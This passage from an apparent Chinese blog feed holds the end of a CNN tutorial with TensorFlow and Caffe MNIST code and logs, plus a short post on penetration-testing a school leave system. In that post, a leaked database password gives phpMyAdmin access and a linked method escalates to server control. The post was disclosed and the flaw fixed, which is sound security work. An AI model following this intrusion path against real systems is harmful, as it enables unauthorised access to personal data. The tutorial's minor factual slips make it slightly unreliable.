a = plt.subplots(2, 10, figsize=(10, 2))    for i in range(examplesToShow):        a[0][i].imshow(np.reshape(mnist.test.images[i], (28, 28)))        a[1][i].imshow(np.reshape(decodeImages[i], (28, 28)))    plt.show()</code></pre><p>训练的过程中 cost 逐渐减小：</p><pre><code class="bash">$ ./Auto-encoder.py...Epoch: 1, cost = 0.097858049Epoch: 2, cost = 0.091431484Epoch: 3, cost = 0.083604947Epoch: 4, cost = 0.078279205Epoch: 5, cost = 0.075574301Optimization Finished!</code></pre><p>识别效果：</p><p><img src="/pics/ANN-Deep-Learning/12.png" srcset="/img/loading.gif" alt></p><h2 id="Convolutional-Neural-Network"><a href="#Convolutional-Neural-Network" class="headerlink" title="Convolutional Neural Network"></a>Convolutional Neural Network</h2><p>深度学习主要依赖于卷积神经网络。卷积神经网络（CNN）是一种前馈神经网络，它的人工神经元可以响应一部分覆盖范围内的周围单元，对于大型图像处理有出色表现。卷积神经网络将原本由手工设计卷积核变成自动学习卷积核。</p><p>傅立叶变换：</p><p>$$<br>F(j\omega)=\int_{-\infty}^{+\infty}f(t)e^{-j\omega t}dt<br>$$</p><p>其中 $e^{-j\omega t}$ 为卷积核。</p><h3 id="LeNet"><a href="#LeNet" class="headerlink" title="LeNet"></a>LeNet</h3><p>由 LeCun 在上世纪 90 年代提出。</p><p><img src="/pics/ANN-Deep-Learning/13.png" srcset="/img/loading.gif" alt></p><p>LeNet 中主要有卷积（Convolution）、降采样（Subsampling）、全连接（Full connection）三种不同的神经网络层。</p><h4 id="Convolution"><a href="#Convolution" class="headerlink" title="Convolution"></a>Convolution</h4><p>假设有 <code>32x32x3</code> 的彩色图像（3 个通道），定义一个卷积核大小为 <code>5x5x3</code>，步长为 <code>[1,1]</code>。若不能全部卷积，可以选择对原图像进行补 0。通过卷积后生成一个 <code>28x28x1</code> 的特征图（Feature Map）：</p><p><img src="/pics/ANN-Deep-Learning/14.png" srcset="/img/loading.gif" alt></p><p>若图像为 $(M,N)$，卷积核大小为 $(m,n)$，步长为 $(u,v)$，那么最后得到的特征图（Feature Map）大小为 $(K,L)$，其中 $K≤\frac{M-m}{u}+1$、$L≤\frac{N-n}{v}+1$。可以将图像卷积看成全连接网络的权值共享（Weight Sharing，权值共享网络）：</p><p><img src="/pics/ANN-Deep-Learning/15.png" srcset="/img/loading.gif" alt></p><p>$$<br>\begin{array}{l}<br>p_1=\omega_1*x_1+\omega_2*x_2+\omega_3*x_4+\omega_4*x5+b_1\\<br>p_2=\omega_1*x_2+\omega_2*x_3+\omega_3*x_5+\omega_4*x6+b_2\\<br>p_3=\omega_1*x_4+\omega_2*x_5+\omega_3*x_7+\omega_4*x8+b_3\\<br>p_4=\omega_1*x_5+\omega_2*x_6+\omega_3*x_8+\omega_4*x9+b_4<br>\end{array}<br>$$</p><p>如果使用 6 个卷积核 就能获得 6 个特征图。若无偏置，共有 $5\times5\times3\times6=450$ 个数；若有偏置，共有 $(5\times5\times5+1)\times6=456$ 个数。做完卷积后，还需要调用 ReLU 等函数进行非线性处理：</p><p><img src="/pics/ANN-Deep-Learning/16.png" srcset="/img/loading.gif" alt></p><h4 id="Subsampling"><a href="#Subsampling" class="headerlink" title="Subsampling"></a>Subsampling</h4><p>每取一个小方阵，取平均值作为新的数。</p><p><img src="/pics/ANN-Deep-Learning/17.png" srcset="/img/loading.gif" alt></p><h4 id="Full-connection"><a href="#Full-connection" class="headerlink" title="Full connection"></a>Full connection</h4><p>将特征值完全展开，两层之间每两个神经元互相连接，和多层神经网络基本一致：</p><p><img src="/pics/ANN-Deep-Learning/18.png" srcset="/img/loading.gif" alt></p><p>其中 MSE 采用 Softmax 函数和交叉熵合用的形式：</p><p>$\begin{cases}Softmax(z)=p\\ E=-\sum_{i=1}^{10}Y_i\log(p_i)\end{cases}$</p><h3 id="AlexNet"><a href="#AlexNet" class="headerlink" title="AlexNet"></a>AlexNet</h3><p>2013 年，Alex Krizhevsky 构建了一个包含 65 万个神经元、超过 6000 万个参数的大规模网络 AlexNet，在 ImageNet 的测试集上获得了非常好的成绩，遥遥领先于第二名。</p><p><img src="/pics/ANN-Deep-Learning/19.png" srcset="/img/loading.gif" alt></p><p>AlexNet 在网络结构上和 LeNet 基本一致。主要有一些改进之处：</p><ol><li>以 ReLU 函数替代 Sigmoid 或 tanh 函数：$ReLU(x)=\max(0,x)$，使网络训练更快速度收敛；</li><li>为降采样操作起了一个新的名字——池化（Pooling），即将邻近的像素作为一个“池子”来重新考虑；<ul><li>AlexNet 中提出了最大池化（Max Pooling）的概念，即对每一个邻近像素组成的“池子”，选取像素的最大值作为输出；</li><li>有重叠的最大池化能够很好地克服过拟合问题，提升系统性能。</li></ul></li><li>随机丢弃（Dropout）。为了避免系统参数更新过快导致过拟合，每次利用训练样本更新参数的时候，随机“丢弃”一定比例的神经元，被丢弃的神经元将不参加训练过程，输入和输出该神经元的权重系数也不做更新，每次训练时的网络架构不一样，但是分享共同的权重系数；<ul><li>减缓了网络收敛速度，也以大概率避免了过拟合的发生。</li></ul></li><li>增加训练样本；<ul><li>将原图水平翻转；</li><li>将 256x256 的图像随机选取 224x224 的片段作为输入图像；</li><li>对每幅图片引入一定的噪声，构成新的图像。</li></ul></li><li>用 GPU 加速训练过程（使用两个 GPU 并行运算）。</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>Caffe（UC Berkeley） -&gt; Caffe2（Facebook）</li><li>Torch（NYU/Facebook） -&gt; PyTorch（Facebook）</li><li>Theano（U Montreal） -&gt; TensorFlow（Google）</li><li>Paddle（Baidu）</li><li>CNTK（Microsoft）</li><li>MXNet（Amazon）</li></ul><h3 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h3><p>实现 LeNet：</p><pre><code class="python">#!/usr/bin/env python3import tensorflow.compat.v1 as tftf.disable_v2_behavior()def weight_variable(shape): # 设置权重w    initial = tf.truncated_normal(shape, stddev=0.1)    return tf.Variable(initial)def bias_variable(shape): # 设置偏置b    initial = tf.constant(0.1, shape=shape)    return tf.Variable(initial)def conv2d(x, W, padding_method=&#39;SAME&#39;): # 卷积函数    return tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding=padding_method)def max_pool_2x2(x): # 最大池化    return tf.nn.max_pool(x, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding=&#39;SAME&#39;)def average_pool_2x2(x): # 平均池化    return tf.nn.avg_pool(x, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding=&#39;SAME&#39;)from tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&#39;/tmp/data/&#39;, one_hot=True)sess = tf.InteractiveSession()x = tf.placeholder(&#39;float&#39;, shape=[None, 784]) # 输入图像大小为28*28y_ = tf.placeholder(&#39;float&#39;, shape=[None, 10]) # 输出结果为10个数字# 第一层卷积W_conv1 = weight_variable([5, 5, 1, 6])b_conv1 = bias_variable([6])# 第二层降采样x_image = tf.reshape(x, [-1, 28, 28, 1])h_conv1 = tf.nn.relu(conv2d(x_image, W_conv1) + b_conv1) # 非线性化h_pool1 = average_pool_2x2(h_conv1) # 平均池化# 第三层卷积W_conv2 = weight_variable([5, 5, 6, 16])b_conv2 = bias_variable([16])# 第四层降采样h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2, &#39;VALID&#39;) + b_conv2) # 非线性化h_pool2 = average_pool_2x2(h_conv2) # 平均池化# 第五层全连接网络W_fc1 = weight_variable([5 * 5 * 16, 120])b_fc1 = bias_variable([120])h_pool2_flat = tf.reshape(h_pool2, [-1, 5 * 5 * 16])h_fc1 = tf.nn.relu(tf.matmul(h_pool2_flat, W_fc1) + b_fc1) # 非线性化keep_prob = tf.placeholder(&#39;float&#39;)h_fc1_drop = tf.nn.dropout(h_fc1, keep_prob) # 随机丢弃# 第六层全连接网络W_fc2 = weight_variable([120, 84])b_fc2 = bias_variable([84])h_fc2 = tf.nn.relu(tf.matmul(h_fc1_drop, W_fc2) + b_fc2) # 非线性化h_fc2_drop = tf.nn.dropout(h_fc2, keep_prob) # 随机丢弃# 第七层全连接网络W_fc3 = weight_variable([84, 10])b_fc3 = bias_variable([10])y_conv = tf.nn.softmax(tf.matmul(h_fc2_drop, W_fc3) + b_fc3) # MSEcross_entropy = -tf.reduce_sum(y_ * tf.log(y_conv))train_step = tf.train.AdamOptimizer(1e-4).minimize(cross_entropy) # Adam优化算法correct_prediction = tf.equal(tf.argmax(y_conv, 1), tf.argmax(y_, 1))accuracy = tf.reduce_mean(tf.cast(correct_prediction, &#39;float&#39;)) # 准确率sess.run(tf.global_variables_initializer())for i in range(10000):    batch = mnist.train.next_batch(50)    if i % 100 == 0:        train_accuracy = accuracy.eval(feed_dict={x:batch[0], y_:batch[1], keep_prob:1.0})        print(&#39;step %d, training accuracy %g&#39; % (i, train_accuracy))    train_step.run(feed_dict={x: batch[0], y_: batch[1], keep_prob: 0.5})print(&#39;test accuracy %g&#39; % accuracy.eval(feed_dict={x:mnist.test.images, y_:mnist.test.labels, keep_prob:1.0}))</code></pre><p>测试的准确率大致为 95.77%：</p><pre><code class="bash">$ ./classfication.py...step 0, training accuracy 0.1step 100, training accuracy 0.38step 200, training accuracy 0.48step 300, training accuracy 0.72step 400, training accuracy 0.72step 500, training accuracy 0.72step 600, training accuracy 0.78step 700, training accuracy 0.7step 800, training accuracy 0.9step 900, training accuracy 0.82step 1000, training accuracy 0.9step 1100, training accuracy 0.9...step 8500, training accuracy 0.92step 8600, training accuracy 0.96step 8700, training accuracy 0.98step 8800, training accuracy 0.96step 8900, training accuracy 0.98step 9000, training accuracy 0.98step 9100, training accuracy 0.98step 9200, training accuracy 0.9step 9300, training accuracy 0.96step 9400, training accuracy 0.92step 9500, training accuracy 0.94step 9600, training accuracy 0.92step 9700, training accuracy 0.98step 9800, training accuracy 0.96step 9900, training accuracy 0.92...test accuracy 0.9577</code></pre><h3 id="Caffe"><a href="#Caffe" class="headerlink" title="Caffe"></a>Caffe</h3><blockquote><p>使用 Caffe 时务必将所有相对路径改为绝对路径。</p></blockquote><p>以 MNIST 上的数据集为例（这里略过安装 Caffe 和下载 MNIST 数据集的过程）。首先通过下载得到的数据创建 lmdb 文件：</p><pre><code class="bash">#!/bin/shset -eDATA=&quot;$HOME/caffe/examples/mnist&quot;BUILD=&quot;$HOME/caffe/build/tools&quot;rm -rf $DATA/mean.binaryproto$BUILD/compute_image_mean $DATA/mnist_train_lmdb $DATA/mean.binaryproto $@</code></pre><p>将 <code>lenet_solver.prototxt</code> 设置如下，一组 Batch 设为 100 个样本，学习率设置为 0.01，每 100 次迭代训练输出一次，每 5000 组存一次快照，最后使用 CPU 进行运算：</p><pre><code class="bash"># The train/test net protocol buffer definitionnet: &quot;/root/caffe/examples/mnist/lenet_train_test.prototxt&quot;# test_iter specifies how many forward passes the test should carry out.# In the case of MNIST, we have test batch size 100 and 100 test iterations,# covering the full 10,000 testing images.test_iter: 100# Carry out testing every 500 training iterations.test_interval: 500# The base learning rate, momentum and the weight decay of the network.base_lr: 0.01momentum: 0.0weight_decay: 0.0005# The learning rate policylr_policy: &quot;inv&quot;gamma: 0.0001power: 0.75# Display every 100 iterationsdisplay: 100# The maximum number of iterationsmax_iter: 10000# snapshot intermediate resultssnapshot: 5000snapshot_prefix: &quot;/root/caffe/examples/mnist/lenet&quot;# solver mode: CPU or GPUsolver_mode: CPU</code></pre><p>训练脚本中设置好 Solver 的路径：</p><pre><code class="bash">#!/bin/shset -eDATA=&quot;$HOME/caffe/examples/mnist&quot;BUILD=&quot;$HOME/caffe/build/tools&quot;$BUILD/caffe train --solver=$DATA/lenet_solver.prototxt $@</code></pre><p>训练得到的准确率为 98.35%：</p><pre><code class="bash">$ ./train_lenet.shI0719 09:13:32.369788  3384 caffe.cpp:197] Use CPU.I0719 09:13:32.370246  3384 solver.cpp:45] Initializing solver from parameters:test_iter: 100test_interval: 500base_lr: 0.01display: 100max_iter: 10000lr_policy: &quot;inv&quot;gamma: 0.0001power: 0.75momentum: 0weight_decay: 0.0005snapshot: 5000snapshot_prefix: &quot;/root/caffe/examples/mnist/lenet&quot;solver_mode: CPUnet: &quot;/root/caffe/examples/mnist/lenet_train_test.prototxt&quot;train_state {  level: 0  stage: &quot;&quot;}I0719 09:13:32.371068  3384 solver.cpp:102] Creating training net from net file: /root/caffe/examples/mnist/lenet_train_test.prototxtI0719 09:13:32.371302  3384 net.cpp:296] The NetState phase (0) differed from the phase (1) specified by a rule in layer mnistI0719 09:13:32.371356  3384 net.cpp:296] The NetState phase (0) differed from the phase (1) specified by a rule in layer accuracyI0719 09:13:32.371500  3384 net.cpp:53] Initializing net from parameters:name: &quot;LeNet&quot;state {  phase: TRAIN  level: 0  stage: &quot;&quot;}layer {  name: &quot;mnist&quot;  type: &quot;Data&quot;  top: &quot;data&quot;  top: &quot;label&quot;  include {    phase: TRAIN  }  transform_param {    scale: 0.00390625  }  data_param {    source: &quot;/root/caffe/examples/mnist/mnist_train_lmdb&quot;    batch_size: 64    backend: LMDB  }}...layer {  name: &quot;loss&quot;  type: &quot;SoftmaxWithLoss&quot;  bottom: &quot;ip2&quot;  bottom: &quot;label&quot;  top: &quot;loss&quot;}I0719 09:13:32.375864  3384 layer_factory.hpp:77] Creating layer mnistI0719 09:13:32.378401  3384 db_lmdb.cpp:35] Opened lmdb /root/caffe/examples/mnist/mnist_train_lmdb...I0719 09:13:32.389917  3384 net.cpp:257] Network initialization done.I0719 09:13:32.390131  3384 solver.cpp:190] Creating test net (#0) specified by net file: /root/caffe/examples/mnist/lenet_train_test.prototxtI0719 09:13:32.390213  3384 net.cpp:296] The NetState phase (1) differed from the phase (0) specified by a rule in layer mnistI0719 09:13:32.390334  3384 net.cpp:53] Initializing net from parameters:name: &quot;LeNet&quot;state {  phase: TEST}layer {  name: &quot;mnist&quot;  type: &quot;Data&quot;  top: &quot;data&quot;  top: &quot;label&quot;  include {    phase: TEST  }  transform_param {    scale: 0.00390625  }  data_param {    source: &quot;/root/caffe/examples/mnist/mnist_test_lmdb&quot;    batch_size: 100    backend: LMDB  }}...layer {  name: &quot;loss&quot;  type: &quot;SoftmaxWithLoss&quot;  bottom: &quot;ip2&quot;  bottom: &quot;label&quot;  top: &quot;loss&quot;}I0719 09:13:32.394325  3384 layer_factory.hpp:77] Creating layer mnistI0719 09:13:32.396040  3384 db_lmdb.cpp:35] Opened lmdb /root/caffe/examples/mnist/mnist_test_lmdbI0719 09:13:32.399293  3384 net.cpp:86] Creating Layer mnist...I0719 09:13:32.408589  3384 net.cpp:257] Network initialization done.I0719 09:13:32.408671  3384 solver.cpp:57] Solver scaffolding done.I0719 09:13:32.408725  3384 caffe.cpp:239] Starting OptimizationI0719 09:13:32.408758  3384 solver.cpp:289] Solving LeNetI0719 09:13:32.408789  3384 solver.cpp:290] Learning Rate Policy: invI0719 09:13:32.409927  3384 solver.cpp:347] Iteration 0, Testing net (#0)I0719 09:13:37.804333  3387 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:13:38.027662  3384 solver.cpp:414]     Test net output #0: accuracy = 0.1248I0719 09:13:38.027835  3384 solver.cpp:414]     Test net output #1: loss = 2.39762 (* 1 = 2.39762 loss)I0719 09:13:38.118224  3384 solver.cpp:239] Iteration 0 (-6.72623e-44 iter/s, 5.709s/100 iters), loss = 2.36513I0719 09:13:38.118404  3384 solver.cpp:258]     Train net output #0: loss = 2.36513 (* 1 = 2.36513 loss)I0719 09:13:38.118474  3384 sgd_solver.cpp:112] Iteration 0, lr = 0.01I0719 09:13:47.032905  3384 solver.cpp:239] Iteration 100 (11.2183 iter/s, 8.914s/100 iters), loss = 0.696854I0719 09:13:47.033085  3384 solver.cpp:258]     Train net output #0: loss = 0.696854 (* 1 = 0.696854 loss)I0719 09:13:47.033146  3384 sgd_solver.cpp:112] Iteration 100, lr = 0.00992565I0719 09:13:55.957051  3384 solver.cpp:239] Iteration 200 (11.207 iter/s, 8.923s/100 iters), loss = 0.349362I0719 09:13:55.957224  3384 solver.cpp:258]     Train net output #0: loss = 0.349362 (* 1 = 0.349362 loss)I0719 09:13:55.957285  3384 sgd_solver.cpp:112] Iteration 200, lr = 0.00985258I0719 09:14:04.869757  3384 solver.cpp:239] Iteration 300 (11.2208 iter/s, 8.912s/100 iters), loss = 0.329913I0719 09:14:04.870034  3384 solver.cpp:258]     Train net output #0: loss = 0.329913 (* 1 = 0.329913 loss)I0719 09:14:04.870095  3384 sgd_solver.cpp:112] Iteration 300, lr = 0.00978075...I0719 09:21:36.396572  3384 solver.cpp:239] Iteration 4800 (11.2309 iter/s, 8.904s/100 iters), loss = 0.132899I0719 09:21:36.396747  3384 solver.cpp:258]     Train net output #0: loss = 0.132899 (* 1 = 0.132899 loss)I0719 09:21:36.396808  3384 sgd_solver.cpp:112] Iteration 4800, lr = 0.00745253I0719 09:21:45.291420  3384 solver.cpp:239] Iteration 4900 (11.2435 iter/s, 8.894s/100 iters), loss = 0.0251573I0719 09:21:45.291604  3384 solver.cpp:258]     Train net output #0: loss = 0.0251575 (* 1 = 0.0251575 loss)I0719 09:21:45.291664  3384 sgd_solver.cpp:112] Iteration 4900, lr = 0.00741498I0719 09:21:54.117733  3384 solver.cpp:464] Snapshotting to binary proto file /root/caffe/examples/mnist/lenet_iter_5000.caffemodelI0719 09:21:54.126977  3384 sgd_solver.cpp:284] Snapshotting solver state to binary proto file /root/caffe/examples/mnist/lenet_iter_5000.solverstateI0719 09:21:54.130437  3384 solver.cpp:347] Iteration 5000, Testing net (#0)I0719 09:21:59.522549  3387 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:21:59.746923  3384 solver.cpp:414]     Test net output #0: accuracy = 0.9807I0719 09:21:59.747100  3384 solver.cpp:414]     Test net output #1: loss = 0.0614721 (* 1 = 0.0614721 loss)I0719 09:21:59.833456  3384 solver.cpp:239] Iteration 5000 (6.87711 iter/s, 14.541s/100 iters), loss = 0.0629105I0719 09:21:59.833653  3384 solver.cpp:258]     Train net output #0: loss = 0.0629108 (* 1 = 0.0629108 loss)I0719 09:21:59.833714  3384 sgd_solver.cpp:112] Iteration 5000, lr = 0.00737788I0719 09:22:08.751772  3384 solver.cpp:239] Iteration 5100 (11.2133 iter/s, 8.918s/100 iters), loss = 0.134128I0719 09:22:08.751960  3384 solver.cpp:258]     Train net output #0: loss = 0.134128 (* 1 = 0.134128 loss)I0719 09:22:08.752022  3384 sgd_solver.cpp:112] Iteration 5100, lr = 0.0073412...I0719 09:29:50.077375  3384 solver.cpp:239] Iteration 9700 (11.2309 iter/s, 8.904s/100 iters), loss = 0.0202741I0719 09:29:50.077550  3384 solver.cpp:258]     Train net output #0: loss = 0.0202745 (* 1 = 0.0202745 loss)I0719 09:29:50.077612  3384 sgd_solver.cpp:112] Iteration 9700, lr = 0.00601382I0719 09:29:58.986270  3384 solver.cpp:239] Iteration 9800 (11.2259 iter/s, 8.908s/100 iters), loss = 0.158889I0719 09:29:58.986459  3384 solver.cpp:258]     Train net output #0: loss = 0.15889 (* 1 = 0.15889 loss)I0719 09:29:58.986519  3384 sgd_solver.cpp:112] Iteration 9800, lr = 0.00599102I0719 09:30:07.907111  3384 solver.cpp:239] Iteration 9900 (11.2108 iter/s, 8.92s/100 iters), loss = 0.0175776I0719 09:30:07.907289  3384 solver.cpp:258]     Train net output #0: loss = 0.0175779 (* 1 = 0.0175779 loss)I0719 09:30:07.907397  3384 sgd_solver.cpp:112] Iteration 9900, lr = 0.00596843I0719 09:30:16.723201  3384 solver.cpp:464] Snapshotting to binary proto file /root/caffe/examples/mnist/lenet_iter_10000.caffemodelI0719 09:30:16.732036  3384 sgd_solver.cpp:284] Snapshotting solver state to binary proto file /root/caffe/examples/mnist/lenet_iter_10000.solverstateI0719 09:30:16.772199  3384 solver.cpp:327] Iteration 10000, loss = 0.041269I0719 09:30:16.772374  3384 solver.cpp:347] Iteration 10000, Testing net (#0)I0719 09:30:22.153097  3387 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:30:22.376965  3384 solver.cpp:414]     Test net output #0: accuracy = 0.9835I0719 09:30:22.377146  3384 solver.cpp:414]     Test net output #1: loss = 0.0502197 (* 1 = 0.0502197 loss)I0719 09:30:22.377204  3384 solver.cpp:332] Optimization Done.I0719 09:30:22.377256  3384 caffe.cpp:250] Optimization Done.</code></pre><p>使用快照存下的权重系数进行测试：</p><pre><code class="bash">#!/bin/shset -eDATA=&quot;$HOME/caffe/examples/mnist&quot;BUILD=&quot;$HOME/caffe/build/tools&quot;$BUILD/caffe test -model $DATA/lenet_train_test.prototxt -weights $DATA/lenet_iter_10000.caffemodel -iterations 100 $@</code></pre><p>测试得到的结果也是 98.35%：</p><pre><code class="bash">$ ./test_lenet.shI0719 09:54:00.532202  3750 caffe.cpp:275] Use CPU.I0719 09:54:00.534042  3750 net.cpp:296] The NetState phase (1) differed from the phase (0) specified by a rule in layer mnistI0719 09:54:00.534274  3750 net.cpp:53] Initializing net from parameters:name: &quot;LeNet&quot;state {  phase: TEST  level: 0  stage: &quot;&quot;}layer {  name: &quot;mnist&quot;  type: &quot;Data&quot;  top: &quot;data&quot;  top: &quot;label&quot;  include {    phase: TEST  }  transform_param {    scale: 0.00390625  }  data_param {    source: &quot;/root/caffe/examples/mnist/mnist_test_lmdb&quot;    batch_size: 100    backend: LMDB  }}...layer {  name: &quot;loss&quot;  type: &quot;SoftmaxWithLoss&quot;  bottom: &quot;ip2&quot;  bottom: &quot;label&quot;  top: &quot;loss&quot;}I0719 09:54:00.539016  3750 layer_factory.hpp:77] Creating layer mnistI0719 09:54:00.539180  3750 db_lmdb.cpp:35] Opened lmdb /root/caffe/examples/mnist/mnist_test_lmdbI0719 09:54:00.539252  3750 net.cpp:86] Creating Layer mnist...I0719 09:54:00.549928  3750 net.cpp:257] Network initialization done.I0719 09:54:00.578881  3750 caffe.cpp:281] Running for 100 iterations.I0719 09:54:00.638658  3750 caffe.cpp:304] Batch 0, accuracy = 1I0719 09:54:00.638818  3750 caffe.cpp:304] Batch 0, loss = 0.0125258I0719 09:54:00.695282  3750 caffe.cpp:304] Batch 1, accuracy = 1I0719 09:54:00.695446  3750 caffe.cpp:304] Batch 1, loss = 0.014934I0719 09:54:00.751154  3750 caffe.cpp:304] Batch 2, accuracy = 0.97I0719 09:54:00.751315  3750 caffe.cpp:304] Batch 2, loss = 0.0793383I0719 09:54:00.807118  3750 caffe.cpp:304] Batch 3, accuracy = 0.99I0719 09:54:00.807282  3750 caffe.cpp:304] Batch 3, loss = 0.0438309I0719 09:54:00.867218  3750 caffe.cpp:304] Batch 4, accuracy = 0.98I0719 09:54:00.868525  3750 caffe.cpp:304] Batch 4, loss = 0.0713425I0719 09:54:00.924510  3750 caffe.cpp:304] Batch 5, accuracy = 0.99I0719 09:54:00.924670  3750 caffe.cpp:304] Batch 5, loss = 0.0617221I0719 09:54:00.980692  3750 caffe.cpp:304] Batch 6, accuracy = 0.97I0719 09:54:00.980855  3750 caffe.cpp:304] Batch 6, loss = 0.0743186I0719 09:54:01.036712  3750 caffe.cpp:304] Batch 7, accuracy = 0.96I0719 09:54:01.036875  3750 caffe.cpp:304] Batch 7, loss = 0.0618587I0719 09:54:01.093209  3750 caffe.cpp:304] Batch 8, accuracy = 1I0719 09:54:01.093359  3750 caffe.cpp:304] Batch 8, loss = 0.0243737...I0719 09:54:05.863339  3750 caffe.cpp:304] Batch 93, accuracy = 1I0719 09:54:05.863505  3750 caffe.cpp:304] Batch 93, loss = 0.0035342I0719 09:54:05.919293  3750 caffe.cpp:304] Batch 94, accuracy = 1I0719 09:54:05.919464  3750 caffe.cpp:304] Batch 94, loss = 0.00404837I0719 09:54:05.975389  3750 caffe.cpp:304] Batch 95, accuracy = 1I0719 09:54:05.975559  3750 caffe.cpp:304] Batch 95, loss = 0.00803444I0719 09:54:05.975966  3752 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:54:06.031582  3750 caffe.cpp:304] Batch 96, accuracy = 0.97I0719 09:54:06.031741  3750 caffe.cpp:304] Batch 96, loss = 0.101935I0719 09:54:06.087718  3750 caffe.cpp:304] Batch 97, accuracy = 0.94I0719 09:54:06.087873  3750 caffe.cpp:304] Batch 97, loss = 0.169228I0719 09:54:06.143560  3750 caffe.cpp:304] Batch 98, accuracy = 0.99I0719 09:54:06.143725  3750 caffe.cpp:304] Batch 98, loss = 0.0384616I0719 09:54:06.199724  3750 caffe.cpp:304] Batch 99, accuracy = 0.99I0719 09:54:06.199882  3750 caffe.cpp:304] Batch 99, loss = 0.023861I0719 09:54:06.199935  3750 caffe.cpp:309] Loss: 0.0502197I0719 09:54:06.200014  3750 caffe.cpp:321] accuracy = 0.9835I0719 09:54:06.200079  3750 caffe.cpp:321] loss = 0.0502197 (* 1 = 0.0502197 loss)</code></pre><h2 id="流行的卷积神经网络结构"><a href="#流行的卷积神经网络结构" class="headerlink" title="流行的卷积神经网络结构"></a>流行的卷积神经网络结构</h2><ul><li>LeNet</li><li>AlexNet</li><li>VGGNet</li><li>GooglLeNet</li><li>ResNet（Residual Net）</li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>浙江大学信电学院《机器学习》课程<br>《机器学习》——周志华<br><a href="https://morvanzhou.github.io/tutorials/machine-learning/tensorflow/" target="_blank" rel="noopener">莫烦 Python——搭建自己的神经网络</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ann</tag>
      
      <tag>dl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次对学校请假系统的渗透测试</title>
    <link href="/2020/07/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E5%AD%A6%E6%A0%A1%E8%AF%B7%E5%81%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2020/07/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E5%AD%A6%E6%A0%A1%E8%AF%B7%E5%81%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>****************************。</p><a id="more"></a><h1 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h1><p>好奇出校码怎么生成的，就试了一下，结果发现了信息泄漏。</p><h1 id="Pentesting"><a href="#Pentesting" class="headerlink" title="Pentesting"></a>Pentesting</h1><p>在获取出校凭证的 JS 代码中通过一个接口获取出校码：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/1.png" srcset="/img/loading.gif" alt></p><p>如果传入错误的 ID，就会报错。这个时候会泄漏部分代码以及数据库密码：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/2.png" srcset="/img/loading.gif" alt></p><p>尝试了以下连接数据库，发现数据库设置了远程不可登录。扫端口，试了 ftp、ssh 弱口令都没有成功。发现一个可疑的 10789 端口：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/3.png" srcset="/img/loading.gif" alt></p><p>打开后是 LNMP 安装成功的界面，包括 phpinfo、phpMyAdmin、探针等后台可以进入。扫目录也能看到：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/4.png" srcset="/img/loading.gif" alt></p><p>用前面得到的密码，测试在本地可以连接数据库：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/5.png" srcset="/img/loading.gif" alt></p><p>在 phpMyAdmin 中可以用相同的密码登录管理后台。之后<a href="https://phyb0x.github.io/2018/10/04/phpmyadmin%E6%8F%90%E6%9D%83/" target="_blank" rel="noopener">进一步还能拿服务器权限</a>：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/6.png" srcset="/img/loading.gif" alt></p><blockquote><p>开放在外网的网站有这种问题，相当于把全校的信息暴露给了别人，对这种不负责任的开发感到很无奈。</p></blockquote><h1 id="Advice"><a href="#Advice" class="headerlink" title="Advice"></a>Advice</h1><ol><li><strong>修改后端代码，如果 ID 不存在，返回 404 界面；</strong></li><li><strong>关闭 10789 端口的服务，或者修改 phpMyAdmin 页面文件名，避免被扫目录。</strong></li></ol><h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><p>已联系开发，且漏洞已修复。</p><p><img src="/pics/记一次对学校请假系统的渗透测试/7.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Machine Learning &amp; SVM</title>
    <link href="/2020/07/09/Machine-Learning-SVM/"/>
    <url>/2020/07/09/Machine-Learning-SVM/</url>
    
